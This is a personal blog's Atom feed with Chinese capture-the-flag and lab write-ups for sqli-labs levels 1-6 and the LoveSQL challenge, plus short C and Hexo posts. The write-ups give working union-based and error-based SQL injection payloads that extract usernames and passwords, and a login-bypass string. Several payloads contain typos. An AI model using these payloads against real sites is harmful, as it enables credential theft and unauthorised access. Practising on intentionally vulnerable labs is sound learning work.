<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="http://ymmmmmmin.github.io.git/atom.xml" rel="self"/>
  
  <link href="http://ymmmmmmin.github.io.git/"/>
  <updated>2022-01-24T10:43:23.773Z</updated>
  <id>http://ymmmmmmin.github.io.git/</id>
  
  <author>
    <name>YmmmmmmIN</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>sqli-labs 5-6</title>
    <link href="http://ymmmmmmin.github.io.git/2022/01/24/sqli-labs-5-6/"/>
    <id>http://ymmmmmmin.github.io.git/2022/01/24/sqli-labs-5-6/</id>
    <published>2022-01-24T08:46:30.000Z</published>
    <updated>2022-01-24T10:43:23.773Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sqli-labs-5-6"><a href="#sqli-labs-5-6" class="headerlink" title="sqli-labs 5-6"></a>sqli-labs 5-6</h1><p>一开始我以为就跟前面四关一样，是个简单的sql注入。常规做法发现做不出来，然后去看题目名称，Double Injection(双查询注入)，就懂了。</p><span id="more"></span><h3 id="先介绍几个需要用到的语句"><a href="#先介绍几个需要用到的语句" class="headerlink" title="先介绍几个需要用到的语句"></a>先介绍几个需要用到的语句</h3><p><strong>rand()函数</strong></p><p>先来看看这个函数的作用，我们多执行几次</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> rand();</span><br></pre></td></tr></table></figure><p><img src="../images/rand%E5%87%BD%E6%95%B0.png" alt="rand函数"></p><p>可以看到，这个函数就是随机返回0~1之间的数</p><p><strong>floor()函数</strong></p><p>先看看单独使用的效果</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">floor</span>(<span class="number">45.6496464</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">floor</span>(<span class="number">12.5649794</span>);</span><br></pre></td></tr></table></figure><p><img src="../images/floor()(1).png" alt="floor()(1)"></p><p>很明显，整个函数就是取整（小于等于自身的整数）的作用。</p><p>在看看一个简单组合</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>我们从里向外看，rand()*2是为了使整个函数最后的结果只有0或1</p><p><img src="../images/floor()(2).png" alt="floor()(2)"></p><p>接下来我们看下这个查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> concat((<span class="keyword">select</span> database()),<span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>));</span><br></pre></td></tr></table></figure><p>看到这么负责的组合语句，先冷静。先看最里面的select database()就是返回数据库名，因为我这里用的是security所以这里就是security。而concat就是连接数据库名和floor。</p><p><img src="../images/concat(2).png" alt="concat(2)"></p><p>如果我们把这条语句后面加上from 一个表名。那么一般会返回security0或security1的一个集合。而数目是由表本身有几条结果决定的。这里的users表里有13个用户，所以返回了13条。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> concat((<span class="keyword">select</span> database()),<span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>)) <span class="keyword">from</span>  users</span><br></pre></td></tr></table></figure><p><img src="../images/concat(5).png" alt="concat(5)"></p><p>接下来再加上group by语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> concat((<span class="keyword">select</span> database()), <span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a;</span><br></pre></td></tr></table></figure><p>我们把 concat((select database()),floor(rand()*2)) 这个结果取名为a，使用它进行分组。这样相同的security 0就分到一组，security 1分到一组，就剩下两个结果了。</p><p><img src="../images/concat(3).png" alt="concat(3)"></p><p>注意这里的database()可以替换成任何你想查的函数，比如version(), user(), datadir()或者其他的查询。比如查表、查列，这些原理都是一样的。</p><p>！最后加上一个聚合函数count(*)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>), concat((<span class="keyword">select</span> database()), <span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a;</span><br></pre></td></tr></table></figure><p>发现第一次竟然报错了，但是第二次又能成功</p><p><img src="../images/concat(4).png" alt="concat(4)"></p><p>这就说明，如果想要页面爆出你想要的数据来，点击一次是没用的，只有点第二次数据库才会报错，才会回显。</p><p>接下来就运用上面的函数进行sql注入</p><h3 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h3><p><strong>1.老样子，先判断注入点类型</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="../images/sqlless-5(1).png" alt="sqlless-5(1)"></p><p>回显正常 加个单引号试试</p><p><img src="../images/sqlless-5(2).png" alt="sqlless-5(2)"></p><p>页面回显错误，将单引号注释掉</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure><p><img src="../images/sqlless-5(3).png" alt="sqlless-5(3)"></p><p>页面回显正常，发现是单引号闭合的字符型注入</p><p><strong>2.使用order by 语句判断，一共有几列数据</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 1--+</span></span><br></pre></td></tr></table></figure><p>回显正常一直到4时，页面回显不正常</p><p><img src="../images/sqlless-5(5).png" alt="sqlless-5(5)"></p><p>发现一共有三列数据</p><p><strong>3.开始查库</strong></p><p>一开始按照原来的方法进行联合查询先找回显位置</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,3--+</span></span><br></pre></td></tr></table></figure><p>发现页面没啥反应，只会出现you are in…….</p><p><img src="../images/sqlless-5(6).png" alt="sqlless-5(6)"></p><p>就想到使用上面的方法进行双查询注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select null,count(*),concat((select database()),floor(rand()*2)) as a from information_schema.tables group by a--+</span></span><br></pre></td></tr></table></figure><p>这是第一次查数据库，页面没啥反应</p><p><img src="../images/sqlless-5(7).png" alt="sqlless-5(7)"></p><p>第二次点击，就爆出了数据库名</p><p><img src="../images/sqlless-5(8).png" alt="sqlless-5(8)"></p><p><strong>4.爆表名</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select null,count(*),concat((select (table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;),floor(rand()*2)) as a from information_schema.tables group by a--+</span></span><br></pre></td></tr></table></figure><p><img src="../images/sqlless-5(9).png" alt="sqlless-5(9)"></p><p>这里又遇到一个问题 ：</p><p>这里多了一个键，键1已经存在虚拟表中，由于键只能唯一，所以此时就会报错。数据表中至少要有3条记录才会报错，所以我们在第二条select语句末尾加上limit x,1即可让它报错继续注入</p><p>第一张表：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select null,count(*),concat((select(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;limit 0,1),floor(rand()*2))as a from information_schema.tables group by a--+</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p><img src="../images/sqlless-5(10).png" alt="sqlless-5(10)"></p><p><strong>注意：在爆的时候有可能需要点击两次及以上，可能一次查不出来，多查几次就出来了。</strong></p><p><img src="../images/sqlless-5(11).png" alt="sqlless-5(11)"></p><p>第二张表：</p><p><img src="../images/sqlless-5(12).png" alt="sqlless-5(12)"></p><p>第三张表：</p><p><img src="../images/sqlless-5(13).png" alt="sqlless-5(13)"></p><p>第四张表：</p><p><img src="../images/sqlless-5(14).png" alt="sqlless-5(14)"></p><p><strong>当想查第五张表时，不管查多少次页面都是you are in…..证明一共就四张表</strong></p><p><strong>5.爆列名</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select null,count(*),concat((select(columns_name) form information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;limit 0,1),floor(rand()*2))as a from infomation_shcema.tables group by a--+</span></span><br></pre></td></tr></table></figure><p><img src="../images/sqlless-5(15).png" alt="sqlless-5(15)"></p><p>通过改变 limit x,1 中的x可以爆出其他列名</p><p>最后可以得到两个有用的列名</p><p><img src="../images/sqlless-5(16).png" alt="sqlless-5(16)"></p><p><img src="../images/sqlless-5(17).png" alt="sqlless-5(17)"></p><p><strong>6.爆字段</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select null,count(*),concat((select concat(username,0x7e,password)from security.users limit 0,1),floor(rand()*2))as a from information_schema.tables group by a--+</span></span><br></pre></td></tr></table></figure><p><img src="../images/sqlless-5(18).png" alt="sqlless-5(18)"></p><p>一样的通过改变limit后面的值，得到其他的数据。</p><h3 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h3><p>第六关与第五关差异不大，由单引号错误变成双引号错误</p><p><img src="../images/sqlless-6(1).png" alt="sqlless-6(1)"></p><p>其他都与第五关相同，做法参照第五关的解法。</p><p>+++</p><p><strong>总结：不同于前四关，后面的难度更大，需要补充一些双查询注入的知识，在解题过程中不要着急，多多尝试。</strong></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;sqli-labs-5-6&quot;&gt;&lt;a href=&quot;#sqli-labs-5-6&quot; class=&quot;headerlink&quot; title=&quot;sqli-labs 5-6&quot;&gt;&lt;/a&gt;sqli-labs 5-6&lt;/h1&gt;&lt;p&gt;一开始我以为就跟前面四关一样，是个简单的sql注入。常规做法发现做不出来，然后去看题目名称，Double Injection(双查询注入)，就懂了。&lt;/p&gt;</summary>
    
    
    
    <category term="sql注入" scheme="http://ymmmmmmin.github.io.git/categories/sql%E6%B3%A8%E5%85%A5/"/>
    
    
    <category term="博客" scheme="http://ymmmmmmin.github.io.git/tags/%E5%8D%9A%E5%AE%A2/"/>
    
    <category term="hexo" scheme="http://ymmmmmmin.github.io.git/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs  1-4</title>
    <link href="http://ymmmmmmin.github.io.git/2022/01/19/sql-labs-1-4/"/>
    <id>http://ymmmmmmin.github.io.git/2022/01/19/sql-labs-1-4/</id>
    <published>2022-01-19T08:06:47.000Z</published>
    <updated>2022-01-24T11:10:07.685Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sqli-labs-1-4"><a href="#sqli-labs-1-4" class="headerlink" title="sqli-labs  1-4"></a>sqli-labs  1-4</h1><p>基本掌握PHP语法后，逐步开始边学边练的过程，第一步便是SQL注入之sqli-labs</p><span id="more"></span><h3 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h3><p><strong>1.经过语句 and 1=2 测试，页面回显正常，所以该地方不是数值查询</strong></p><p><strong>2.接着尝试在id后面加上’，发现页面回显不正常，表示可能存在SQL字符注入</strong></p><p><img src="../images/sqlless-1(3).png" alt="sqlless-1(3)"></p><p><strong>3.在id=1’之后加上–+注释掉，发现页面回显正常，说明这个地方是单引号字符型注入。</strong></p><p><strong>4.使用order by语句判断，该表一共有几列数据</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 1--+</span></span><br></pre></td></tr></table></figure><p><img src="../images/sqlless-1(4).png" alt="sqlless-1(4)"></p><p>一直重复到order by 4 时页面回显不正常，说明改表只有三列数据</p><p><img src="../images/sqlless-1(5).png" alt="sqlless-1(5)"></p><p><strong>5.将id=1报错，使用联合查询查看页面是否有显示位置</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,3--+</span></span><br></pre></td></tr></table></figure><p><img src="../images/sqlless-1(6).png" alt="sqlless-1(6)"></p><p>发现页面有两个显示位置</p><p><strong>6.利用sql查询语句爆破出库内的数据库名，表民，列名，字段信息</strong></p><p>（1）查询库名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(schema_name) from information_schema.schemata--+</span></span><br></pre></td></tr></table></figure><p><img src="../images/sqlless-1(7).png" alt="sqlless-1(7)"></p><p>（2）猜测数据在security中，查询security中所有的表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure><p><img src="../images/sqlless-1(8).png" alt="sqlless-1(8)"></p><p>（3）猜测数据在表users中，爆破出列名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure><p><img src="../images/sqlless-1(9).png" alt="sqlless-1(9)"></p><p>（4）查询数据,得到所有的用户名和密码</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>ymm<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(concat_ws(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,id,username,password)) from security.users--+</span></span><br></pre></td></tr></table></figure><p><img src="../images/sqlless-1(10).png" alt="sqlless-1(10)"></p><h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><p><strong>1.判断是否存在SQL注入和注入类型</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>返回成功</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span></span><br></pre></td></tr></table></figure><p>返回失败</p><p>判断为数字型注入</p><p><strong>2.接着与Less-1的做法相同，分别爆出数据库名，表名，列名，数据（详细过程参考第一关）</strong></p><h3 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h3><p><strong>1.判断是否存在SQL注入和注入类型</strong></p><p>（1）向页面输入？id=1，页面显示正常</p><p><img src="../images/sqlless-3(1).png" alt="sqlless-3(1)"></p><p>（2）尝试加个单引号，页面报错</p><p><img src="../images/sqlless-3(2).png" alt="sqlless-3(2)"></p><p>根据报错信息发现再加个），可能是注入点</p><p>（3）输入?id=1’)–+页面回显正常，说明是以 (‘’) 方式闭合字符串的字符型注入</p><p><img src="../images/sqlless-3(3).png" alt="sqlless-3(3)"></p><p><strong>2.接着与Less-1的做法相同，分别爆出数据库名，表名，列名，数据（详细过程参考第一关）</strong></p><h3 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h3><p><strong>1.判断是否存在SQL注入和注入类型</strong></p><p>与第三关类似</p><p><img src="../images/sqlless-4(3).png" alt="sqlless-4(3)"></p><p>根据报错信息</p><p><img src="../images/sqlless-4(2).png" alt="sqlless-4(2)"></p><p>发现第四关使用的是 (“”) 的方式闭合字符串</p><p><strong>2.接着与Less-1的做法相同，使用联合查询分别爆出数据库名，表名，列名，数据（详细过程参考第一关）</strong></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;sqli-labs-1-4&quot;&gt;&lt;a href=&quot;#sqli-labs-1-4&quot; class=&quot;headerlink&quot; title=&quot;sqli-labs  1-4&quot;&gt;&lt;/a&gt;sqli-labs  1-4&lt;/h1&gt;&lt;p&gt;基本掌握PHP语法后，逐步开始边学边练的过程，第一步便是SQL注入之sqli-labs&lt;/p&gt;</summary>
    
    
    
    <category term="sql注入" scheme="http://ymmmmmmin.github.io.git/categories/sql%E6%B3%A8%E5%85%A5/"/>
    
    
    <category term="博客" scheme="http://ymmmmmmin.github.io.git/tags/%E5%8D%9A%E5%AE%A2/"/>
    
    <category term="hexo" scheme="http://ymmmmmmin.github.io.git/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>[极客大挑战2019]LoveSQL</title>
    <link href="http://ymmmmmmin.github.io.git/2021/11/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/"/>
    <id>http://ymmmmmmin.github.io.git/2021/11/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/</id>
    <published>2021-11-14T10:33:16.000Z</published>
    <updated>2021-11-14T14:59:14.291Z</updated>
    
    <content type="html"><![CDATA[<h1 id="极客大挑战2019-LoveSQL-writeup"><a href="#极客大挑战2019-LoveSQL-writeup" class="headerlink" title="[极客大挑战2019]LoveSQL-writeup"></a>[极客大挑战2019]LoveSQL-writeup</h1><h2 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h2><p>打开题目后得到页面</p><p><img src="../images/lovesql%20%E5%BC%80%E5%A7%8B%E9%A1%B5%E9%9D%A2.png" alt="lovesql 开始页面"></p><p>尝试一下输入用户名为1密码为1</p><p><img src="../images/%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81%E4%B8%BA1.png" alt="用户名密码为1"></p><p>发现用户名和密码输入错误</p><p>接着尝试用户名为1‘ 密码为1</p><p><img src="../images/%E7%94%A8%E6%88%B7%E5%90%8D%E4%B8%BA1%E2%80%98%E5%AF%86%E7%A0%81%E4%B8%BA1.png" alt="用户名为1‘密码为1"></p><p>得到结果，发现回显了sql语句报错，所以username是个注入点</p><p>而且会发现得到的语句中1的后面多了一个单引号使句子报错</p><p>所以是sql单引号闭合的题目</p><p>这时我们可以使用万能密码</p><p>+++</p><p>username:1’ or 1=1#</p><p>password:随便一个数</p><p>+++</p><p>就会得到登入成功界面</p><p><img src="../images/%E7%99%BB%E5%85%A5%E6%88%90%E5%8A%9F%E7%95%8C%E9%9D%A2.png" alt="登入成功界面"></p><p>将得到的password输入flag发现并不是该题的flag</p><p>使用order by语句判断列数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 1--+</span></span><br></pre></td></tr></table></figure><p><img src="../images/%E4%BD%BF%E7%94%A8order%20by%20%E6%9F%A5%E8%AF%A2%E5%88%97%E6%95%B01.png"></p><p>接着同样操作将1改为2，得到相同结果</p><p>之后以此类推</p><p>一直到输入到第4列</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by4--+</span></span><br></pre></td></tr></table></figure><p><img src="../images/%E4%BD%BF%E7%94%A8%20order%20by%E6%9F%A5%E8%AF%A2%E5%88%97%E6%95%B04.png" alt="使用 order by查询列数4"></p><p>得到页面不一样了，发现不存在第4列，所以只存在3列数据</p><p>开始使用联合查询</p><h5 id="1-测试回显点"><a href="#1-测试回显点" class="headerlink" title="1.测试回显点"></a>1.测试回显点</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,2,3--+</span></span><br></pre></td></tr></table></figure><p><img src="../images/%E6%89%BE%E5%88%B0%E5%9B%9E%E6%98%BE%E7%82%B9.png" alt="找到回显点"></p><p>得到回显点为2和3</p><h5 id="2-查询数据库"><a href="#2-查询数据库" class="headerlink" title="2.查询数据库"></a>2.查询数据库</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,database(),3--+</span></span><br></pre></td></tr></table></figure><p><img src="../images/%E6%9F%A5%E6%89%BE%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D.png" alt="查找数据库名"></p><p>得到数据库名为geek</p><h5 id="3-查询表"><a href="#3-查询表" class="headerlink" title="3.查询表"></a>3.查询表</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database()--+</span></span><br></pre></td></tr></table></figure><p><img src="../images/%E6%9F%A5%E8%AF%A2%E8%A1%A8.png" alt="查询表"></p><p>得到了两张表，猜测flag放在l0ve1ysq1表中</p><h5 id="4-查询字段"><a href="#4-查询字段" class="headerlink" title="4.查询字段"></a>4.查询字段</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,database(),group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>l0ve1ysq1<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure><p>这里最好使用十六进制，防止报错</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,database(),group_concat(column_name) from information_schema.columns where table_name=0x6c3076653179737131--+</span></span><br></pre></td></tr></table></figure><p><img src="../images/%E6%9F%A5%E8%AF%A2%E5%AD%97%E6%AE%B5.png" alt="查询字段"></p><h5 id="5-查询数据"><a href="#5-查询数据" class="headerlink" title="5.查询数据"></a>5.查询数据</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; unionn select 1,database(),group_concat(id,username,password) from l0ev1ysq1--+</span></span><br></pre></td></tr></table></figure><p><img src="../images/%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE.png" alt="查询数据"></p><p>得到了一大串数据</p><p>往后翻翻会发现flag</p><p><img src="../images/%E5%BE%97%E5%88%B0flag.png" alt="得到flag"></p><h1 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h1><p>还在琢磨中……</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;极客大挑战2019-LoveSQL-writeup&quot;&gt;&lt;a href=&quot;#极客大挑战2019-LoveSQL-writeup&quot; class=&quot;headerlink&quot; title=&quot;[极客大挑战2019]LoveSQL-writeup&quot;&gt;&lt;/a&gt;[极客大挑战2019</summary>
      
    
    
    
    <category term="web前端" scheme="http://ymmmmmmin.github.io.git/categories/web%E5%89%8D%E7%AB%AF/"/>
    
    
    <category term="博客" scheme="http://ymmmmmmin.github.io.git/tags/%E5%8D%9A%E5%AE%A2/"/>
    
    <category term="hexo" scheme="http://ymmmmmmin.github.io.git/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>C语言的基础代码（1）</title>
    <link href="http://ymmmmmmin.github.io.git/2021/10/27/C%E8%AF%AD%E8%A8%80%E7%9A%84%E5%9F%BA%E7%A1%80%E4%BB%A3%E7%A0%81%EF%BC%881%EF%BC%89/"/>
    <id>http://ymmmmmmin.github.io.git/2021/10/27/C%E8%AF%AD%E8%A8%80%E7%9A%84%E5%9F%BA%E7%A1%80%E4%BB%A3%E7%A0%81%EF%BC%881%EF%BC%89/</id>
    <published>2021-10-27T14:12:29.000Z</published>
    <updated>2021-10-27T15:01:48.126Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C语言的基础代码（1）"><a href="#C语言的基础代码（1）" class="headerlink" title="C语言的基础代码（1）"></a>C语言的基础代码（1）</h1><p>在c语言中，打印出相同的内容可以写出各种各样的代码。我们可以从简到繁的思路依次看到它多种境界。使用多种循环语句混合及嵌套，结合顺序结构和选择结构，可以编写出效率更高的程序应用。</p><p>​    1.打印3-1000之间的素数</p><p>​       最简单的一种（将这个数x除以小于x且大于1的数，如果不能整除就是素数）：</p><p><img src="../images/%E7%B4%A0%E6%95%B0%E6%99%AE%E9%80%9A%E7%89%88.png" alt="素数普通版"></p><p>​         运行结果：</p><p><img src="../images/%E6%99%AE%E9%80%9A%E7%89%88%E9%80%9F%E5%BA%A6.png" alt="普通版速度"></p><p>进一步的：（减少循环次数）</p><p><img src="../images/%E7%B4%A0%E6%95%B0%E9%AB%98%E6%95%88%E7%89%88.png" alt="素数高效版"></p><p>运行结果：<img src="../images/%E9%AB%98%E6%95%88%E7%89%88%E9%80%9F%E5%BA%A6.png" alt="高效版速度"></p><p>将简单版和进阶版相对比</p><p>很显然，将两者时间进行比较，进阶版所用时间更少，当循环的次数越多所用时间越多，可见合理利用多种循环语句混合及嵌套，结合顺序结构和选择结构，是更高效的。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;C语言的基础代码（1）&quot;&gt;&lt;a href=&quot;#C语言的基础代码（1）&quot; class=&quot;headerlink&quot; title=&quot;C语言的基础代码（1）&quot;&gt;&lt;/a&gt;C语言的基础代码（1）&lt;/h1&gt;&lt;p&gt;在c语言中，打印出相同的内容可以写出各种各样的代码。我们可以从简到繁</summary>
      
    
    
    
    <category term="web前端" scheme="http://ymmmmmmin.github.io.git/categories/web%E5%89%8D%E7%AB%AF/"/>
    
    
    <category term="博客" scheme="http://ymmmmmmin.github.io.git/tags/%E5%8D%9A%E5%AE%A2/"/>
    
    <category term="hexo" scheme="http://ymmmmmmin.github.io.git/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://ymmmmmmin.github.io.git/2021/09/18/hello-world/"/>
    <id>http://ymmmmmmin.github.io.git/2021/09/18/hello-world/</id>
    <published>2021-09-18T08:49:35.251Z</published>
    <updated>2021-09-18T08:58:00.059Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Hello-Hexo"><a href="#Hello-Hexo" class="headerlink" title="Hello Hexo"></a>Hello Hexo</h2><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to 